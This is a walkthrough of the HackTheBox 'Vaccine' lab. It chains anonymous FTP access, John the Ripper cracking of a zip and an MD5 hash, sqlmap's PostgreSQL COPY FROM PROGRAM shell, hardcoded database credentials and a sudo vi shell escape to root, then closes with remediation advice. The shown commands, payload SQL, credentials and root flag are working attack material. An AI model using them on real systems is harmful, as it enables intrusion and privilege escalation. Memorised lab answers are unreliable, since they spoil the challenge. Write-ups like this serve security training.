# Vaccine (HTB) - PostgreSQL RCE & SUID Environment Escapes

**Platform:** HackTheBox | **Target OS:** Linux (Ubuntu) | **Difficulty:** Easy  
**Focus:** Cryptography (PKZIP/MD5), PostgreSQL Stacked Queries (`COPY FROM PROGRAM`), Source Code Review, and GTFOBins Sudo Escapes (`vi`).

---

## 1. Executive Summary & Attack Surface
The "Vaccine" engagement demonstrates a complex, multi-stage attack chain originating from a perimeter misconfiguration and culminating in a full system compromise. The attack path included:
1. **Information Disclosure:** Exploiting anonymous FTP access to exfiltrate an encrypted source code backup.
2. **Offline Cryptanalysis:** Cracking a PKZIP archive and subsequently cracking a hardcoded MD5 hash found in the PHP source code to gain frontend web access.
3. **Database Exploitation (RCE):** Identifying a Stacked-Query SQL Injection in the dashboard, leveraging PostgreSQL's native functions to spawn an interactive OS-level shell.
4. **Lateral Movement & Privilege Escalation:** Recovering plaintext database credentials from the webroot to access the system via SSH, followed by abusing permissive `sudo` rights on the `vi` text editor to escape the restricted environment and achieve `root`.

---

## 2. Reconnaissance & Network Protocol Analysis

We initiated perimeter reconnaissance using an optimized Nmap SYN scan (`-sS`), focusing on the top 1000 ports to minimize latency and firewall triggers.

```bash
$ sudo nmap -sS -sV -v --top-ports 1000 -T4 10.129.54.60
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```
**Analysis:** The presence of `vsftpd 3.0.3` alongside a web server (Port 80) often indicates a potential misconfiguration where FTP shares overlap with web directories or contain backup artifacts.

---

## 3. Cryptography & Forensic Data Acquisition

Connecting to the FTP service utilizing the `anonymous` account granted us access to the file system, revealing a compressed archive: `backup.zip`.

```text
ftp> get backup.zip
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
226 Transfer complete.
```

### Offline Key Cracking
The archive was encrypted. Using `zip2john`, we extracted the cryptographic hash and utilized John the Ripper (JTR) with the `rockyou.txt` wordlist to perform an offline dictionary attack against the PKZIP algorithm.

```bash
$ zip2john backup.zip > zip_hash.txt
$ john zip_hash.txt --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
Loaded 1 password hash (PKZIP [32/64])
741852963        (backup.zip)
```

Extracting the archive revealed the web application's source code (`index.php`). Static code analysis exposed a hardcoded authentication bypass mechanic utilizing an MD5 hash.

```php
if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
    $_SESSION['login'] = "true";
    header("Location: dashboard.php");
}
```

We extracted the raw MD5 hash and cracked it locally:
```bash
$ echo "2cb42f8734ea607eefed3b70af13bbd3" > hash.txt
$ john --wordlist=rockyou.txt --format=raw-md5 hash.txt
qwerty789        (?)
```
*Credentials Acquired:* `admin` : `qwerty789`

---

## 4. Initial Foothold: PostgreSQL Remote Code Execution

Authenticating to the web portal allowed us to intercept the `search` parameter. We utilized `sqlmap` to automate the injection testing, discovering multiple vulnerabilities including Error-based, Boolean-blind, and Stacked Queries.

```bash
$ sqlmap -u "http://10.129.54.60/dashboard.php" --data="search=test" --cookie="PHPSESSID=vqfp2fn7c8of2erq3k88c2ath8" --os-shell --batch
[INFO] the back-end DBMS is PostgreSQL
[INFO] testing if current user is DBA
[INFO] retrieved: '1'
[INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[INFO] calling Linux OS shell.
os-shell>
```

**OS-Level Mechanics (`COPY FROM PROGRAM`):**
How does an SQL Injection lead to a system shell? `sqlmap` detected the backend as PostgreSQL and verified Database Administrator (DBA) rights. In PostgreSQL version 9.3 and later, the `COPY` command was updated to support executing system commands via the `PROGRAM` execution layer. 
Under the hood, `sqlmap` executes a stacked query similar to:
`DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';`
This forces the underlying Linux OS to execute the command under the context of the `postgres` service account, returning an interactive pseudo-shell.

---

## 5. Lateral Movement & Privilege Escalation (GTFOBins)

Operating as the `postgres` user within the OS-shell, we traversed the web directory to uncover hardcoded SSH credentials for lateral movement.

```text
os-shell> cat /var/www/html/dashboard.php
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!"); 
```

We established a stable SSH session using `postgres`:`P@s5w0rd!`.

### Privilege Escalation via Sudo Escape
Executing `sudo -l` revealed a specific misconfiguration:
```bash
User postgres may run the following commands on vaccine:
    (ALL) NOPASSWD: /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

**The Exploitation Mechanic:**
The SysAdmin intended to allow the `postgres` user to solely edit the database configuration file using the `vi` text editor with root privileges. However, `vi` possesses a built-in feature to execute OS commands from within the editor context. 

By executing the allowed `sudo` command and typing `:!/bin/sh` inside the `vi` editor, the editor spawns a child process (`/bin/sh`). Because the parent process (`vi`) was executed via `sudo`, the spawned shell inherits the elevated EUID (Effective User ID), granting instant `root` access.

```bash
$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
# Inside vi, we typed:
:!/bin/sh

# whoami
root
# cat /root/root.txt
dd6e058e814260bc70e9bbdef2715849
```

---

## 6. Defensive Remediation & Detection Engineering

1. **Cryptography & Source Code:** Passwords must never be hardcoded into PHP source files, especially using deprecated and easily crackable algorithms like MD5. Utilize `password_hash()` with modern algorithms (e.g., Argon2id).
2. **Database Hardening:** The web application should interact with the PostgreSQL database using a low-privileged service account, **never** as a DBA or the `postgres` superuser, thereby neutralizing the `COPY FROM PROGRAM` RCE vector.
3. **Sudo Least Privilege:** Never grant `sudo` execution rights to interactive binaries (like `vi`, `less`, `more`, `awk`, or `nmap`) as they contain trivial shell-escape functions. If a user must edit a specific root-owned file, utilize `sudoedit` instead, which drops privileges before launching the editor.
